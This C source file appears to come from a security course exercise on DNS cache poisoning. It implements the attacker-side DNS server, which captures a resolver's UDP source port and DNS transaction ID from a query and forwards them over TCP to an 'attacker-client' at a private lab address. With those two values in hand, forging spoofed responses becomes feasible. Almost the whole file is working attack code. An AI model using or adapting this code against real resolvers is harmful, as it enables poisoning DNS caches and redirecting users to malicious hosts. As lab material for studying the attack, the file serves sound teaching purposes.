// ex2_server_debug.c
// Debug version of attacker-server:
// 1. listen on UDP port 53
// 2. receive one DNS query from resolver (for wwXXXX.attacker.cybercourse.example.com)
// 3. extract resolver UDP source port and DNS TXID
// 4. send {port, txid} to attacker-client over TCP 192.168.1.202:12345
// 5. send a simple DNS response back to resolver so it is satisfied, then wait

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <ldns/ldns.h>

#define PORT_UDP_DNS       53
#define MAX_DNS_REQUEST    512
#define ATTACKER_CLIENT_IP "192.168.1.202"
#define CONTROL_PORT       12345

typedef struct {
    uint16_t resolver_port;  // UDP source port of resolver
    uint16_t txid;           // DNS transaction ID
} debug_info_t;

// receive one DNS query, fill buffer and client address
static ssize_t recv_dns_query(int sockfd,
                              uint8_t *buf,
                              size_t buf_size,
                              struct sockaddr_in *client_addr,
                              socklen_t *client_len)
{
    ssize_t n = recvfrom(sockfd,
                         buf,
                         buf_size,
                         0,
                         (struct sockaddr *)client_addr,
                         client_len);
    if (n < 0) {
        perror("recvfrom");
    }
    return n;
}

// extract txid from DNS wire (first 2 bytes)
static uint16_t get_txid(const uint8_t *buf, size_t len)
{
    if (len < 2U) {
        return 0U;
    }
    uint16_t id = (uint16_t)(((uint32_t)buf[0] << 8U) |
                              (uint32_t)buf[1]);
    return id;
}

// send a minimal NOERROR DNS response back to resolver
static void send_simple_response(int sockfd,
                                 const uint8_t *request,
                                 size_t req_len,
                                 const struct sockaddr_in *client_addr,
                                 socklen_t client_len)
{
    ldns_pkt *pkt = NULL;
    ldns_status st = ldns_wire2pkt(&pkt, request, req_len);
    if (st != LDNS_STATUS_OK || pkt == NULL) {
        fprintf(stderr, "ldns_wire2pkt failed: %s\n",
                ldns_get_errorstr_by_id(st));
        return;
    }

    ldns_pkt *resp = ldns_pkt_clone(pkt);
    if (resp == NULL) {
        ldns_pkt_free(pkt);
        return;
    }

    ldns_pkt_set_qr(resp, 1);  // response
    ldns_pkt_set_aa(resp, 1);  // authoritative
    ldns_pkt_set_rcode(resp, LDNS_RCODE_NOERROR);

    uint8_t *wire = NULL;
    size_t wire_len = 0U;
    st = ldns_pkt2wire(&wire, resp, &wire_len);
    if (st != LDNS_STATUS_OK) {
        fprintf(stderr, "ldns_pkt2wire failed: %s\n",
                ldns_get_errorstr_by_id(st));
        ldns_pkt_free(resp);
        ldns_pkt_free(pkt);
        return;
    }

    (void)sendto(sockfd,
                 wire,
                 wire_len,
                 0,
                 (const struct sockaddr *)client_addr,
                 client_len);

    free(wire);
    ldns_pkt_free(resp);
    ldns_pkt_free(pkt);
}

// send debug_info_t to attacker-client over TCP
static int send_debug_info_to_client(const debug_info_t *info)
{
    int sockfd = -1;
    struct sockaddr_in addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket TCP");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CONTROL_PORT);
    if (inet_pton(AF_INET, ATTACKER_CLIENT_IP, &addr.sin_addr) != 1) {
        perror("inet_pton ATTACKER_CLIENT_IP");
        close(sockfd);
        return -1;
    }

    printf("DEBUG(server): connecting to attacker-client %s:%d...\n",
           ATTACKER_CLIENT_IP, CONTROL_PORT);

    if (connect(sockfd,
                (struct sockaddr *)&addr,
                (socklen_t)sizeof(addr)) != 0) {
        perror("connect TCP to client");
        close(sockfd);
        return -1;
    }

    ssize_t s = send(sockfd, info, sizeof(*info), 0);
    if (s != (ssize_t)sizeof(*info)) {
        perror("send debug_info");
        close(sockfd);
        return -1;
    }

    printf("DEBUG(server): sent resolver_port=%u txid=0x%04x to client\n",
           (unsigned int)info->resolver_port,
           (unsigned int)info->txid);

    close(sockfd);
    return 0;
}

int main(void)
{
    int sockfd;
    struct sockaddr_in servaddr;
    struct sockaddr_in client_addr;
    socklen_t client_len;
    uint8_t buf[MAX_DNS_REQUEST];

    // 1. open UDP socket on port 53
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket UDP");
        return 1;
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT_UDP_DNS);

    if (bind(sockfd, (struct sockaddr *)&servaddr,
             (socklen_t)sizeof(servaddr)) != 0) {
        perror("bind UDP 53");
        close(sockfd);
        return 1;
    }

    printf("DEBUG(server): listening on UDP port 53...\n");

    client_len = (socklen_t)sizeof(client_addr);
    ssize_t n = recv_dns_query(sockfd,
                               buf,
                               sizeof(buf),
                               &client_addr,
                               &client_len);
    if (n <= 0) {
        close(sockfd);
        return 1;
    }

    uint16_t port = ntohs(client_addr.sin_port);
    uint16_t txid = get_txid(buf, (size_t)n);

    printf("DEBUG(server): got DNS query from %s:%u, txid=0x%04x\n",
           inet_ntoa(client_addr.sin_addr),
           (unsigned int)port,
           (unsigned int)txid);

    // 2. send a simple response back to resolver so it doesn't retry
    send_simple_response(sockfd, buf, (size_t)n, &client_addr, client_len);

    // 3. send debug info to attacker-client over TCP
    debug_info_t info;
    info.resolver_port = port;  // host order
    info.txid = txid;           // host order

    (void)send_debug_info_to_client(&info);

    printf("DEBUG(server): done; sleeping so process stays alive.\n");
    // keep process alive for a while so you can inspect with Wireshark
    for (;;) {
        sleep(60);
    }

    close(sockfd);
    return 0;
}
